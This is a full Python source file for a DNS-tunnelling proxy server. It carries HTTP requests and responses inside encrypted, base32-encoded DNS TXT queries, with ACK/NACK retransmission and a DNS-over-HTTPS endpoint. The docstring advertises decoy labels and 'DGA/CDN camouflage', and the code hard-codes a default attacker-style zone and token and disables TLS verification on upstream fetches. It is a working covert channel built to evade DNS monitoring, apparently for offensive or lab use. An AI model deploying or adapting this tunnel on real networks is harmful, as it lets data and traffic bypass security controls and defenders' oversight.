#!/usr/bin/env python3
"""dnsproxy_server v2 - TCP-over-DNS proxy with ACK/NACK reliability + DGA/CDN camouflage.

Query names:  [decoy...].<data1>...<dataN>.<seq5>.<session16>.<zone>
  decoys  = 0-2 random labels (skipped: first char 0/1/8/9, outside base32)
  data    = b32( frame XOR keystream , hmac8 ) split across <=44-char labels,
            concatenated before decode -> ~90 upstream bytes per query
  seq     = base36 zero-padded (0..36^5-1), acked back to client
  session = 16 random alnum chars, key material

Frame: [u8 type][payload]; types 1 OPEN 2 DATA 3 EOR 4 POLL 5 REQUEST(chseq) 6 FRAG
Crypto: key=SHA256(b"labtun-v2"||token||session); ks=SHA256(key||dir||seq||ctr) XOR;
        tag=HMAC-SHA256(key,dir||ct)[:8]     (dir 1=up 2=down)

Downstream record (TXT, one per answer): [u32 chseq][u8 status][u32 ack][data zlib?]
  chseq = downstream chunk number (client detects gaps -> REQUEST retransmit)
  ack   = highest contiguous upstream seq received (client retransmits > ack)

Env: DP_ZONE DP_PORT DP_TOKEN DP_ALLOW DP_ALLOW_ANY DP_MAX_RESP
     DP_DOH_PORT=443 (+DP_DOH_CERT/DP_DOH_KEY) also serves DNS-over-HTTPS /dns-query
     DP_DROP=N (test: drop reply once every Nth seq)  DP_GAP=1 (test: serve one chunk late)
"""
import base64
import hashlib
import hmac
import json
import os
import secrets
import socket
import ssl
import struct
import threading
import time
import urllib.parse
import urllib.request
import zlib

ZONE = os.environ.get("DP_ZONE", "dns1.apexadversary.com").lower().rstrip(".")
ZONE_LABELS = ZONE.split(".")
PORT = int(os.environ.get("DP_PORT", "53"))
TOKEN = os.environ.get("DP_TOKEN", "b2f8f4e5b00f25a12a03070633c7e49c")
ALLOW = [h.strip().lower() for h in os.environ.get(
    "DP_ALLOW", "github.com,githubusercontent.com,apexadversary.com,127.0.0.1,localhost").split(",") if h.strip()]
ALLOW_ANY = os.environ.get("DP_ALLOW_ANY") == "1"
MAX_RESP = int(os.environ.get("DP_MAX_RESP", str(50 * 1024 * 1024)))
DATA_MAX = 300
SESSION_TTL = 600
WINDOW_MAX = 2048
DROP_EVERY = int(os.environ.get("DP_DROP", "0"))
GAP_TEST = os.environ.get("DP_GAP") == "1"

OPEN, DATA, EOR, POLL, REQUEST, FRAG = 1, 2, 3, 4, 5, 6
ST_MORE, ST_FINAL, ST_ERR = 0, 1, 2
NO_CHSEQ = 0xFFFFFFFF
B36 = "0123456789abcdefghijklmnopqrstuvwxyz"

sessions = {}
sess_lock = threading.Lock()
dropped_seqs = set()

_b32alpha = base64.b32encode(b"").decode()[:0]


def b32e(b):
    return base64.b32encode(bytes(b)).decode("ascii").lower().rstrip("=")


def b32d(s):
    if isinstance(s, bytes):
        s = s.decode("ascii", "replace")
    s = "".join(s.split()).upper()
    return base64.b32decode(s + "=" * ((-len(s)) % 8))


def seq_b36(n):
    s = ""
    for _ in range(5):
        s = B36[n % 36] + s
        n //= 36
    return s


def seq_from_b36(s):
    n = 0
    for ch in s:
        i = B36.find(ch)
        if i < 0:
            raise ValueError("bad seq")
        n = n * 36 + i
    return n


def derive_key(session):
    return hashlib.sha256(b"labtun-v2" + TOKEN.encode() + session.encode()).digest()


def keystream(key, direction, seq, n):
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out += hashlib.sha256(
            key + bytes([direction]) + struct.pack(">I", seq & 0xFFFFFFFF) +
            struct.pack(">I", ctr)).digest()
        ctr += 1
    return bytes(out[:n])


def seal(key, direction, seq, pt):
    if len(pt) > 64:
        comp = zlib.compress(pt, 6)
        if len(comp) < len(pt):
            pt = comp
            pt = b"\x01" + pt
        else:
            pt = b"\x00" + pt
    else:
        pt = b"\x00" + pt
    ct = bytes(a ^ b for a, b in zip(pt, keystream(key, direction, seq, len(pt))))
    tag = hmac.new(key, bytes([direction]) + ct, hashlib.sha256).digest()[:8]
    return ct + tag


def open_seal(key, direction, seq, blob):
    if len(blob) < 9:
        raise ValueError("short packet")
    ct, tag = blob[:-8], blob[-8:]
    want = hmac.new(key, bytes([direction]) + ct, hashlib.sha256).digest()[:8]
    if not hmac.compare_digest(tag, want):
        raise ValueError("bad tag")
    pt = bytes(a ^ b for a, b in zip(ct, keystream(key, direction, seq, len(ct))))
    if pt[:1] == b"\x01":
        pt = zlib.decompress(pt[1:])
    else:
        pt = pt[1:]
    return pt


def allow_url(url):
    if ALLOW_ANY:
        return True
    try:
        host = urllib.parse.urlsplit(url).hostname or ""
    except Exception:
        return False
    host = host.lower()
    return any(host == a or host.endswith("." + a) for a in ALLOW)


def do_fetch(sess):
    try:
        req = urllib.request.Request(
            sess["url"], data=bytes(sess["body"]) if sess["method"] == "POST" else None,
            method=sess["method"], headers=sess["headers"])
        with urllib.request.urlopen(req, timeout=30,
                                    context=ssl._create_unverified_context()) as r:
            head = f"HTTP/1.1 {r.status} {r.reason}\r\n".encode()
            for k, v in r.headers.items():
                head += f"{k}: {v}\r\n".encode()
            body = r.read(MAX_RESP - 4096)
        return head + b"\r\n" + body
    except Exception:
        return None


def finalize(sess):
    if sess["done"] or sess["err"] is not None:
        return
    if sess["url"] is None:
        sess["err"], sess["done"] = b"no OPEN frame", True
        return
    if not allow_url(sess["url"]):
        sess["err"], sess["done"] = b"url not allowlisted", True
        return
    if sess["cl"] is not None and len(sess["body"]) < sess["cl"]:
        sess["err"], sess["done"] = b"incomplete body", True
        return
    raw = do_fetch(sess)
    with sess_lock:
        if raw is None:
            sess["err"] = b"upstream fetch failed"
        else:
            sess["resp"] = raw
            for c in range((len(raw) + DATA_MAX - 1) // DATA_MAX):
                sess["window"][c] = raw[c * DATA_MAX:(c + 1) * DATA_MAX]
        sess["done"] = True


def handle_frame(sess, ftype, body):
    if ftype == OPEN:
        try:
            meta = json.loads(body.decode("utf-8"))
        except Exception:
            sess["err"] = b"bad OPEN"
            return
        if TOKEN and meta.get("k", "") != TOKEN:
            sess["err"] = b"bad token"
            return
        sess["method"] = str(meta.get("m", "GET"))[:8]
        sess["url"] = str(meta.get("u", ""))
        sess["cl"] = meta.get("cl")
        sess["headers"] = {"User-Agent": str(meta.get("ua", "dnsproxy/1.0"))}
        sess["body"] = bytearray()
        sess["offs"] = set()
    elif ftype == DATA:
        if len(body) >= 4:
            off = struct.unpack(">I", body[:4])[0]
            data = body[4:]
            if off + len(data) > MAX_RESP:
                sess["err"] = b"body too large"
                return
            if len(sess["body"]) < off + len(data):
                sess["body"].extend(b"\x00" * (off + len(data) - len(sess["body"])))
            sess["body"][off:off + len(data)] = data
            sess["offs"].add(off)
    elif ftype == EOR:
        if sess["cl"] is None or len(sess["body"]) >= sess["cl"] or sess["method"] == "GET":
            finalize(sess)
        else:
            threading.Thread(target=finalize, args=(sess,), daemon=True).start()
    elif ftype == REQUEST:
        if len(body) >= 4:
            sess["want"] = struct.unpack(">I", body[:4])[0]
    elif ftype == POLL:
        pass


def process_frame(sess, seq, ftype, body):
    if ftype == FRAG and len(body) >= 4:
        midx = struct.unpack(">H", body[:2])[0]
        idx, total = body[2], body[3]
        buf = sess["frags"].setdefault(midx, [total, {}])
        buf[1][idx] = body[4:]
        if len(buf[1]) == buf[0]:
            inner = b"".join(buf[1][i] for i in range(buf[0]))
            del sess["frags"][midx]
            if inner:
                handle_frame(sess, inner[0], inner[1:])
    elif ftype in (OPEN, DATA, EOR, REQUEST, POLL):
        handle_frame(sess, ftype, body)
    else:
        sess["err"] = b"bad type"


def pump(sess, seq):
    """-> (status, ack, chseq|None, data)  — cached per query seq (idempotent retry)."""
    with sess_lock:
        if seq in sess["cache"]:
            return sess["cache"][seq]
        while sess["cont"] in sess["seen"]:
            sess["cont"] += 1
        ack = sess["cont"]

        out = None
        want = sess.get("want")
        if want is not None:
            sess["want"] = None
            if want in sess["window"]:
                data = sess["window"][want]
                last = (len(sess["resp"]) - 1) // DATA_MAX
                st = ST_FINAL if (sess["done"] and want == last) else ST_MORE
                out = (st, ack, want, data)
            else:
                out = (ST_ERR, ack, None, b"chunk not in window")

        if out is None:
            resp = sess["resp"]
            if sess["rp"] >= len(resp):
                if sess["err"] is not None and not resp:
                    out = (ST_ERR, ack, None, sess["err"][:300])
                elif sess["done"]:
                    out = (ST_FINAL, ack, None, b"")
                else:
                    out = (ST_MORE, ack, None, b"")
            else:
                chseq = sess["rp"] // DATA_MAX
                if GAP_TEST and not sess["gapped"] and sess["done"] and len(resp) > DATA_MAX * 2:
                    sess["window"][chseq] = resp[chseq * DATA_MAX:(chseq + 1) * DATA_MAX]
                    sess["rp"] += DATA_MAX
                    sess["gapped"] = True
                    chseq = sess["rp"] // DATA_MAX
                data = resp[chseq * DATA_MAX:(chseq + 1) * DATA_MAX]
                sess["rp"] += len(data)
                sess["window"][chseq] = data
                if sess["rp"] >= len(resp) and sess["done"]:
                    out = (ST_FINAL, ack, chseq, data)
                else:
                    out = (ST_MORE, ack, chseq, data)

        if len(sess["cache"]) > 4096:
            sess["cache"].clear()
        if len(sess["window"]) > WINDOW_MAX:
            for k in sorted(sess["window"])[:len(sess["window"]) - WINDOW_MAX]:
                del sess["window"][k]
        sess["cache"][seq] = out
        return out


def parse_name(buf, pos):
    labels = []
    jumped = False
    end = pos
    seen = set()
    while True:
        ln = buf[pos]
        if ln == 0:
            if not jumped:
                end = pos + 1
            break
        if ln & 0xC0 == 0xC0:
            ptr = struct.unpack(">H", buf[pos:pos + 2])[0] & 0x3FFF
            if not jumped:
                end = pos + 2
            if ptr in seen:
                raise ValueError("ptr loop")
            seen.add(ptr)
            pos = ptr
            jumped = True
            continue
        pos += 1
        labels.append(buf[pos:pos + ln].decode("ascii", "replace").lower())
        pos += ln
    return labels, end


def build_response(req, qname_raw, answers):
    tid = req[:2]
    qd = struct.unpack(">H", req[4:6])[0]
    qend = 12
    for _ in range(qd):
        _, qend = parse_name(req, qend)
        qend += 4
    body = req[12:qend]
    pkt = tid + struct.pack(">HHHHH", 0x8180, qd, len(answers), 0, 0) + body
    for atype, txt in answers:
        pkt += b"\xc0\x0c"
        pkt += struct.pack(">HHIH", atype, 1, 0, len(txt) + 1)
        pkt += bytes([len(txt)]) + txt
    return pkt


def build_servfail(req):
    tid = req[:2]
    flags = struct.unpack(">H", req[2:4])[0]
    return tid + struct.pack(">H", (flags & 0x7900) | 0x8002) + req[6:]


def process_query(req):
    """Pure query handler -> response bytes, None (deliberate drop / too short)."""
    try:
        if len(req) < 12:
            return None
        qd = struct.unpack(">H", req[4:6])[0]
        if qd < 1:
            return build_servfail(req)
        labels, pos = parse_name(req, 12)
        qtype, _qclass = struct.unpack(">HH", req[pos:pos + 4])
        qname_raw = req[12:pos]

        zl = len(ZONE_LABELS)
        if len(labels) < zl + 3 or labels[-zl:] != ZONE_LABELS:
            return build_response(req, qname_raw, [])
        if qtype != 16:
            return build_response(req, qname_raw, [])

        idx = len(labels) - zl
        seq_s, sess_id = labels[idx - 2], labels[idx - 1]
        data_lab = "".join(l for l in labels[:idx - 2] if l and l[0] not in "0189")
        if not data_lab:
            return build_servfail(req)
        try:
            seq = seq_from_b36(seq_s)
        except ValueError:
            return build_servfail(req)

        now = time.time()
        with sess_lock:
            sess = sessions.get(sess_id)
            if sess is None:
                sess = {"body": bytearray(), "offs": set(), "url": None, "method": "GET",
                        "cl": None, "headers": {}, "resp": b"", "rp": 0, "done": False,
                        "err": None, "cache": {}, "window": {}, "frags": {},
                        "seen": set(), "cont": 0, "want": None, "gapped": False,
                        "first": None, "ts": now}
                sessions[sess_id] = sess
            sess["ts"] = now
            for k in [k for k, v in sessions.items() if now - v["ts"] > SESSION_TTL]:
                sessions.pop(k, None)

        key = derive_key(sess_id)
        try:
            pt = open_seal(key, 1, seq, b32d(data_lab))
        except Exception:
            return build_servfail(req)

        if seq not in sess["seen"]:
            try:
                process_frame(sess, seq, pt[0], pt[1:])
                sess["seen"].add(seq)
                if sess.get("first") is None:
                    sess["first"] = seq
                    sess["cont"] = seq
            except Exception:
                sess["err"] = b"bad frame"

        status, ack, chseq, data = pump(sess, seq)

        if DROP_EVERY and seq % DROP_EVERY == 0 and seq not in dropped_seqs:
            dropped_seqs.add(seq)
            return None

        rec = struct.pack(">I", chseq if chseq is not None else NO_CHSEQ)
        rec += bytes([status]) + struct.pack(">I", ack) + data
        sealed = seal(key, 2, seq, rec)
        txt = b32e(sealed).encode("ascii")
        out = []
        while txt:
            out.append(txt[:255])
            txt = txt[255:]
        if not out:
            out = [b""]
        return build_response(req, qname_raw, [(16, t) for t in out])
    except Exception as e:
        import traceback
        print(f"[-] query error: {e}")
        traceback.print_exc()
        try:
            return build_servfail(req)
        except Exception:
            return None


def handle(req, addr, sock):
    resp = process_query(req)
    if resp:
        sock.sendto(resp, addr)


def _recvn(conn, n):
    buf = b""
    while len(buf) < n:
        chunk = conn.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def tcp_conn(conn):
    try:
        conn.settimeout(30)
        hdr = _recvn(conn, 2)
        if not hdr:
            return
        msg = _recvn(conn, struct.unpack(">H", hdr)[0])
        if not msg:
            return
        resp = process_query(msg)
        if resp:
            conn.sendall(struct.pack(">H", len(resp)) + resp)
    except Exception:
        pass
    finally:
        try:
            conn.close()
        except Exception:
            pass


def _bind_tcp(srv):
    """Wildcard first; fall back to interface IPs (systemd-resolved owns 127.0.0.53:53)."""
    candidates = ["0.0.0.0"]
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 53))
        candidates.append(s.getsockname()[0])
        s.close()
    except Exception:
        pass
    for addr in candidates:
        for i in range(3 if addr == "0.0.0.0" else 8):
            try:
                srv.bind((addr, PORT))
                return addr
            except OSError:
                time.sleep(1)
    return None


def tcp_server():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bound = _bind_tcp(srv)
    if bound is None:
        print("[-] dns-over-tcp bind failed on all addresses", flush=True)
        return
    srv.listen(64)
    print(f"[*] dns-over-tcp listening on {bound}:{PORT}", flush=True)
    while True:
        conn, _addr = srv.accept()
        threading.Thread(target=tcp_conn, args=(conn,), daemon=True).start()


def start_doh(port, cert, key_path):
    import urllib.parse as _up
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class DoHHandler(BaseHTTPRequestHandler):
        timeout = 20   # bound every read: an idle/TLS-probe client must not leak a thread

        def _send(self, code, body, ctype):
            if isinstance(body, str):
                body = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_POST(self):
            if _up.urlsplit(self.path).path != "/dns-query":
                return self._send(404, "not found", "text/plain")
            n = int(self.headers.get("Content-Length", 0) or 0)
            if n <= 0 or n > 65535:
                return self._send(400, "bad length", "text/plain")
            resp = process_query(self.rfile.read(n))
            if resp is None:
                return self._send(504, "no upstream", "text/plain")
            self._send(200, resp, "application/dns-message")

        def do_GET(self):
            if _up.urlsplit(self.path).path == "/healthz":
                return self._send(200, "ok", "text/plain")
            self._send(404, "not found", "text/plain")

        def log_message(self, fmt, *a):
            print(f"[doh] {fmt % a}", flush=True)

    httpd = ThreadingHTTPServer(("0.0.0.0", port), DoHHandler)
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ctx.load_cert_chain(cert, key_path)
    httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True,
                                     do_handshake_on_connect=False)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    print(f"[*] DoH endpoint https://0.0.0.0:{port}/dns-query (cert={cert})")


def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(("0.0.0.0", PORT))
    print(f"[*] dnsproxy_server v2 zone={ZONE} port={PORT} "
          f"allow={'ANY' if ALLOW_ANY else ALLOW} token={'set' if TOKEN else 'off'} "
          f"drop={DROP_EVERY} gap={GAP_TEST}")
    threading.Thread(target=tcp_server, daemon=True).start()
    doh_port = int(os.environ.get("DP_DOH_PORT", "0"))
    if doh_port:
        here = os.path.dirname(os.path.abspath(__file__))
        doh_cert = os.environ.get("DP_DOH_CERT", os.path.join(here, "ingest_cert.pem"))
        doh_key = os.environ.get("DP_DOH_KEY", os.path.join(here, "ingest_key.pem"))
        if os.path.exists(doh_cert) and os.path.exists(doh_key):
            start_doh(doh_port, doh_cert, doh_key)
        else:
            print(f"[-] DoH disabled: missing {doh_cert} / {doh_key}")
    while True:
        req, addr = sock.recvfrom(4096)
        threading.Thread(target=handle, args=(req, addr, sock), daemon=True).start()


if __name__ == "__main__":
    main()
